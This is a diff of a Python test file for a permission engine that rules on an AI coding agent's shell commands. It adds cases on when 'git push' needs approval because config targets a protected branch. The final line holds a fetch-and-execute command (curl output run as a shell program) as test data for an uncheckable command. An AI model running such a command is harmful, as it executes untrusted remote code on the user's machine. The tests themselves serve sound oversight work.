@@ -129,9 +129,7 @@ def test_a_new_store_is_autonomous_and_an_old_one_migrates_to_standard_keeping_i
     (lambda ws: write(ws, "src/new.py"), "allow", None),
     (lambda ws: bash(ws, "git push origin feature"), "allow", None),
     (lambda ws: bash(ws, "git push origin main"), "ask", "d-push-default"),
-    (lambda ws: bash(ws, "git push"), "ask", "d-push-default"),               # its upstream may be main
     (lambda ws: bash(ws, "cd sub && git push origin HEAD:main"), "ask", "d-push-default"),
-    (lambda ws: bash(ws, "git push origin HEAD"), "ask", "d-push-default"),     # HEAD may be the default branch
     (lambda ws: bash(ws, "git push origin refs/heads/*:refs/heads/*"), "deny", "d-push-default"),   # it can't tell: split it
     (lambda ws: bash(ws, "git push origin HEAD:refs/heads/release/desktop"), "ask", "d-push-release-sub"),
     (lambda ws: bash(ws, 'git show --stat abc def | grep -v "^ \\|^$"'), "allow", "d-readonly"),   # no syntax ask
@@ -230,6 +228,64 @@ def test_autonomous_runs_everything_but_default_branch_pushes_and_destructive_ac
     got = decide(request)
     assert got.decision == decision, got.reason
     assert (got.rule.id if got.rule else None) == rule
+
+
+@pytest.mark.parametrize("command,branch,config,expected", [
+    ("git push", "feature", {}, "allow"),
+    ("git push", "main", {"push.default": "current"}, "ask"),
+    ("git push", "feature", {"push.default": "upstream", "branch.feature.merge": "refs/heads/main"}, "ask"),
+    ("git push", None, {}, "ask"),
+    ("git push origin", "feature", {"push.default": "current"}, "allow"),
+    ("git push -u origin HEAD", "feature", {"remote.origin.push": "HEAD:main"}, "allow"),
+    ("git push origin HEAD", "main", {}, "ask"),
+    ("git push", "release/desktop", {"push.default": "current"}, "ask"),
+    ("git push", "feature", {"branch.feature.pushremote": "publish", "remote.pushdefault": "origin",
+                              "remote.origin.push": "HEAD:main", "remote.publish.url": "/publish",
+                              "remote.publish.push": "HEAD:topic"}, "allow"),
+    ("git push", "feature", {"remote.pushdefault": "publish", "remote.publish.url": "/publish",
+                              "remote.publish.push": "HEAD:main"}, "ask"),
+    ("git push", "feature", {"remote.origin.push": "refs/heads/*:refs/heads/*"}, "ask"),
+    ("git push", "feature", {"remote.origin.push": "+HEAD:topic"}, "deny"),
+    ("git push", "feature", {"remote.origin.push": ["HEAD:topic", "HEAD:main"]}, "ask"),
+    ("git push", "feature", {"remote.origin.mirror": ""}, "ask"),
+    ("git push", "feature", {"push.default": "matching"}, "ask"),
+    ("git push", "feature", {"branch.feature.merge": "refs/heads/main"}, "ask"),
+    ("git push", "feature", None, "ask"),
+    ("git -c push.default=upstream push", "feature", {}, "ask"),
+    ("cd unknown && git push", "feature", {}, "ask"),
+    ("git switch main && git push", "feature", {}, "ask"),
+    ("git -C . push origin HEAD", "feature", {}, "allow"),
+])
+def test_bare_push_asks_only_for_a_protected_target(tmp_path, monkeypatch, command, branch, config, expected):
+    from brindle import git
+
+    folder = str(tmp_path)
+    values = {"remote.origin.url": "/origin", "branch.feature.remote": "origin",
+              "branch.feature.merge": "refs/heads/feature", **(config or {})}
+    reads = []
+
+    def run(args, cwd, **kwargs):
+        assert os.path.realpath(cwd) == folder  # Resolve HEAD in the worktree, not the main checkout.
+        reads.append(tuple(args))
+        if args[0] == "symbolic-ref":
+            # A same-named tag makes Git's --short output ambiguous.
+            ref = ("heads/main" if branch == "main" else branch) if "--short" in args else f"refs/heads/{branch}"
+            return subprocess.CompletedProcess(args, 0 if branch else 1, ref or "", "")
+        assert args[0] == "config"
+        return subprocess.CompletedProcess(args, 0 if config is not None else 2,
+                                           "".join(f"{k}\n{v}\0" for k, vs in values.items()
+                                                   for v in (vs if isinstance(vs, list) else [vs])), "")
+
+    monkeypatch.setattr(git, "run", run)
+    monkeypatch.setattr(git, "main_repo_root", lambda path: folder + "/main-checkout")
+    monkeypatch.setattr(permissions, "default_branch", lambda root: "main")
+    permissions.apply_preset("autonomous")
+    req = Request("claude", "bash", "Bash", folder, folder, folder + "/main-checkout", command=command)
+    assert decide(req).decision == expected
+    assert len(reads) == len(set(reads))  # Rules share the reads within this check.
+    if command == "git push" and branch == "feature" and config == {}:
+        values.update({"push.default": "upstream", "branch.feature.merge": "refs/heads/main"})
+        assert decide(req).decision == "ask"  # The next check must read changed config.
 
 
 UNCHECKED = "P=$(curl -s https://example.com/p); $P"    # a program only the run knows
